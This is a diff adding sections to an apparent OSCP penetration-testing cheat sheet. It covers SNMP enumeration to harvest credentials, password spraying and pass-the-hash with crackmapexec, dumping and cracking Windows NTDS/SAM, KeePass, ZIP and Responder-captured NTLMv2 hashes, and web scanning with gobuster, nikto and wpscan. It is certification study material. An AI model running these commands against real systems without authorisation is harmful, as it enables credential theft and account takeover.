@@ -965,6 +965,134 @@ Finally, run binary with sudo perms and specifiy shared object
 
 ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/5e590910-05b1-47d1-9be4-ac1e17ab5a1e)
 
+# SNMP
+
+HackTricks Page
+
+(https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
+
+CTF’s involving SNMP walk
+
+(https://steflan-security.com/hack-the-box-pit-walkthrough/](https://steflan-security.com/hack-the-box-pit-walkthrough/) and https://resources.infosecinstitute.com/topic/snmp-pentesting/)
+
+**Two Ways to go about this first is to download `snmp-mibs-downloader` (this is discussed in the hacktricks article linked above see pic below)**
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/02adf3a6-0669-4dab-8eee-72fcb62eacb9)
 
 
+`sudo apt-get install snmp-mibs-downloader`
+
+`sudo download-mibs`
+
+then edit the `/etc/snmp/snmp.conf` file and remove the line from the image above
+
+Next, run this command and see if credientals get snagged (Photo example below):
+
+`snmpwalk -v 2c -c public 192.168.190.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull`
+
+if this doesnt work may also be:
+
+`snmpwalk -v 1 -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/24ddf192-5158-4a6e-8943-aafcb6e22376)
+
+Otherwise run this command 
+
+`snmpwalk -v 1 -c public <IP> .1 > <Whatever>.txt`
+
+This will output A LOT OF INFO, `cat`out the text file and `grep` for “STRING” and observe the output. Could give a hint such as a “Password was Reset” or “Password Default” FOR EXAMPLE I receive this output once with FTP also being open on the device
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/2f694ace-865a-40e2-b81b-e8f136efe0dc)
+
+If snmp port is open but snmpwalk fails may need to brute force community string. That is shown in the section above of Active Direcrtoy magic. I like this wordlist (https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt) however that is up to prefrence
+
+
+# Passowrd attacks/N’ Cracking Stuff N’ hashes N’ Stuff
+
+### Password attacks
+
+### AWLAYS CHECK https://crackstation.net/
+
+### Spraying against winrm
+
+`sudo crackmapexec winrm <IP> --local-auth -u <filenameORusername> -p <filenameORpassword>`
+
+Use —local-auth when attempting to login in locally, can be necessary to attempt spraying into AD environment
+
+Also you can brute force with hashes 
+
+`sudo crackmapexec winrm <IP> -u <filenameORusername> -H <filenameORhashes>`
+
+### Craking zip:
+
+make hash of zip file w/ zip2hohn:
+
+`zip2john <ZipFileName>.zip > <Whatever>.hash`
+
+and then crack with joh
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt sitebackup3.hash`
+
+
+### Cracking SYSTEM and ntds.dit
+
+`impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
+
+`ntds.dit` and `SYSTEM` could be any file name in theory, usually just transfer them to my kali with the same exact file name though
+
+### **Cracking SAM and SYSTEM (NTLM)**
+
+Have SAM and SYSTEM file on kali
+
+`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
+
+then put hash into a file and crack with HashCat (can always pass the hash as well if the service permits)
+
+`hashcat -m 1000 <filename>.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
+### Cracking keepass (.kdbx)
+
+Install KeePassX:
+
+`sudo apt-get -y install keepassx`
+
+Use `keepass2john` to make has of .kdbx file to crack 
+
+`keepass2john <filename>.kdbx`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/16279add-1320-4af2-aefd-b36132c58a1f)
+
+make sure to remove everything before the colleen before put into in the hash file
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/94c63744-f71d-48ba-9ac7-37e3dc8fbc1f)
+
+Crack with hashcat:
+
+`hashcat -m 13400 <filename> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
+### **Cracking Hash snagged from SMB auth (NTLM-SSP)**
+
+[Getting Creds via NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#cracking-ntlmv2)
+
+Get hash from responder and copy and paste into file
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/777cdf2b-c80d-4e66-8f82-eb0c0e3ca3f4)
+
+then run hashcat to crack
+`hashcat -m 5600 <filename> /usr/share/wordlists/rockyou.txt --force`
+
+# Web Attack Guide
+
+1. Any comments / juicy info in source code
+    1. Comments of custom API’s we could attempt to reach out too
+    2. Passwords in comments
+    3. Versions in source code or displayed on web page
+    4. All around info about device we are sending this forum back too
+2. Can we check out robots.txt?
+3. Get them scans going
+    1. `gobuster dir -u http://<IP>:<port> -w <wordlist>`
+    2. `nikto -h http://<IP>`
+    `nikto -h $ip -p 80,8080,1234` #test different ports with one scan
+    3. `wpscan -u <IP>/wp/`
+    4. `wpscan --url <URL> --enumerate p --plugins-detection aggressive -o <outputDirectory>`
 
